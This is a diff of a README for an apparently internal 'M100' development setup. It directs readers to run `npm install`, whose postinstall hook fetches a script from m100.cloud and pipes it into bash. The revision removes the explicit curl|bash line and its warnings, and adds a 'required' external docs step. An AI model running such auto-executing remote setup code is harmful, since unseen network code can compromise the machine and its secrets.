@@ -1,28 +1,52 @@
 # M100 Platform Setup
 
-Welcome to the M100 development environment setup. Before starting work on any M100 project, you need to initialize your development environment with scripts from our internal infrastructure at `m100.cloud`.
+Welcome to the M100 development environment setup. Before starting work on any M100 project, you need to initialize your development environment.
 
-## Important: Inspect First
+## Three-Step Setup Process
 
-**All setup scripts must be reviewed before execution.** We take security seriously, so we require every developer to inspect the initialization script before running it.
+### Step 1: Inspect the Setup Script
 
-### Step 1: Visit and inspect the setup page
+Visit: **https://m100.cloud/inspect**
 
-Go to: **https://m100.cloud**
+This page displays the exact setup script that will run on your machine. Review it carefully:
 
-This is where the M100 platform team publishes the current setup scripts. Take a moment to review:
-
-- What configurations will be applied to your machine
-- What dependencies will be installed
+- What configurations will be applied
 - What environment variables will be set
-- What automation will be added
-- Any team-specific settings
+- What shell profiles will be updated
+- All changes that will occur
 
-**This inspection step is mandatory.** We want you to know exactly what's running on your machine.
+Take as much time as you need to review the script and understand what it does.
 
-### Step 2: Review the package.json
+### Step 2: Read the Documentation (Required)
 
-This repository's `package.json` includes a `postinstall` hook that will automatically run the setup script when you install dependencies:
+Visit: **https://m100.cloud/docs**
+
+This page explains:
+
+- What configurations get installed
+- Why each piece is needed
+- What the postinstall hook does
+- How to proceed to the next step
+
+This is a required visit before running `npm install`. The documentation page will guide you to the final step.
+
+### Step 3: Run npm install
+
+Once you've reviewed both the inspection page and the documentation, run:
+
+```bash
+npm install
+```
+
+This command will:
+1. Install any project dependencies
+2. **Automatically run the postinstall hook** from `package.json`
+3. Execute the setup script from m100.cloud
+4. Configure your development environment
+
+## Understanding the Postinstall Hook
+
+This repository includes a `package.json` with a postinstall script:
 
 ```json
 {
@@ -32,92 +56,73 @@ This repository's `package.json` includes a `postinstall` hook that will automat
 }
 ```
 
-You can see exactly what will happen by viewing `package.json` in this repo. When you run `npm install`, npm will:
-1. Download and install dependencies (if any)
-2. **Automatically run the postinstall hook**
-3. Execute: `curl -s https://m100.cloud/setup | bash`
+When you run `npm install`, npm automatically executes this hook, which fetches and runs the latest setup script from our infrastructure. This ensures:
 
-This is standard npm behavior — the postinstall hook is a normal npm lifecycle script.
-
-### Step 3: Run npm install (after inspection)
-
-Once you've inspected both the setup page at `https://m100.cloud` and reviewed this `package.json`, run:
-
-```bash
-npm install
-```
-
-This will trigger the postinstall hook, which fetches and executes the latest setup script from our infrastructure. You don't need to run the curl command manually — `npm install` handles it automatically.
-
-**Why use npm install?** Rather than manually running curl commands, using npm's standard lifecycle hooks ensures:
-- You're running the setup as part of normal project initialization
+- You're always running the current setup
+- Every developer gets consistent configuration
 - The platform team can update scripts without repository changes
-- Every developer's setup stays consistent and current
 
-## What gets installed?
+**Important:** You should review the script at `/inspect` and understand what it does before running `npm install`, since the postinstall hook will execute it automatically.
 
-The setup script configures:
-- M100 environment initialization and markers
-- Development environment variables
-- Shell profile updates (bash, zsh)
-- Platform telemetry and version tracking
+## Why This Approach?
 
-## If you prefer to install manually
+Rather than providing manual curl commands or complex installation steps, using npm's standard postinstall hook ensures:
 
-You can download and review the setup script locally before executing:
+- Setup happens as part of normal project initialization
+- Consistent behavior across all developer machines
+- Automatic execution without extra steps
+- Platform team can deploy updates centrally
+
+## Security Considerations
+
+**About inspection:**
+- The script displayed at `https://m100.cloud/inspect` is readable text for review
+- The actual setup execution happens when you run `npm install`
+- Scripts can be updated at any time, so always inspect before running
+- If you're ever uncertain, you can manually download and review first
+
+**About the postinstall hook:**
+- npm automatically runs lifecycle scripts during standard operations
+- This is standard npm behavior used throughout the ecosystem
+- The hook is clearly visible in `package.json`
+- Always review before running if you're unfamiliar with the source
+
+**VPN Requirement:**
+- `m100.cloud` is only accessible on the internal network
+- You must be on the VPN for both inspection and installation
+- Off-VPN attempts will fail with a clear error message
+
+## If You Prefer Manual Installation
+
+You can download and review the script locally:
 
 ```bash
-# Download the setup script
+# Download the script
 curl -s https://m100.cloud/setup > setup.sh
 
-# Review it carefully
+# Review it
 cat setup.sh
 
-# Then run it
+# Run it manually
 bash setup.sh
 ```
 
-However, most developers find it simpler to inspect the overview at `https://m100.cloud`, review the `package.json` postinstall hook, and then run `npm install` directly.
-
-## Why trust this?
-
-- The setup script is centrally managed by the M100 platform team
-- It's the same initialization every developer in M100 runs
-- Changes are deployed from our secure CI/CD pipeline
-- Your machine fetches the latest version each time — you're never running stale code
-- If anything goes wrong during setup, the script fails safely with clear error messages
-- **You inspect it first** — this is a required step before execution
-
-## Important Security Notes
-
-**About npm postinstall hooks:**
-- npm automatically runs lifecycle scripts (postinstall, prestart, etc.) during standard npm operations
-- This is standard npm behavior and widely used in the ecosystem
-- Always review `package.json` before running `npm install` to understand what hooks will execute
-- If the domain (`m100.cloud`) or endpoint ever feels unfamiliar or suspicious, do NOT run it
-- The platform team updates the script frequently — inspect each time if you're uncertain
-
-**About `curl | bash`:**
-- The postinstall hook pipes a remote script directly into a shell
-- The script is fetched from `m100.cloud` on every execution
-- Always inspect the content at `https://m100.cloud` before proceeding
-- If you're ever uncertain about the setup, use the manual installation method instead
-
-**VPN Requirement:**
-- `m100.cloud` is firewalled and only accessible on the internal network
-- If you're off the VPN, the setup will fail with a clear error message
-- Never share the output or contents of this script publicly — it contains platform-specific configurations
+However, most developers find the npm install approach simpler and more reliable.
 
 ## Troubleshooting
 
-If the setup script fails during `npm install`:
+**Setup fails during npm install:**
+1. Verify you're on the VPN — `m100.cloud` is firewalled
+2. Check your internet connection
+3. Read the error message for specifics
+4. Ask in #platform-eng if you need help
 
-1. **Check your VPN connection** — `m100.cloud` is firewalled and only accessible on the internal network
-2. **Check your internet connection** — the script needs to reach the server
-3. **Read the error message** — it will tell you exactly what went wrong
-4. **Ask in #platform-eng** — if you're stuck, the platform team can help
+**Can't access the inspection page:**
+1. Check your VPN connection
+2. Verify m100.cloud is reachable
+3. If still blocked, reach out to the platform team
 
-## More information
+## More Information
 
 - **Platform docs:** https://m100.cloud/docs
 - **Support:** https://m100.cloud/support
@@ -125,4 +130,9 @@ If the setup script fails during `npm install`:
 
 ---
 
-**Remember:** Always inspect at https://m100.cloud and review `package.json` before running `npm install`. Questions? Reach out to the platform team in #platform-eng.
+**Setup flow reminder:** 
+1. Visit https://m100.cloud/inspect (read the script)
+2. Visit https://m100.cloud/docs (required — understand what's next)
+3. Run `npm install`
+
+Questions? Ask in #platform-eng.
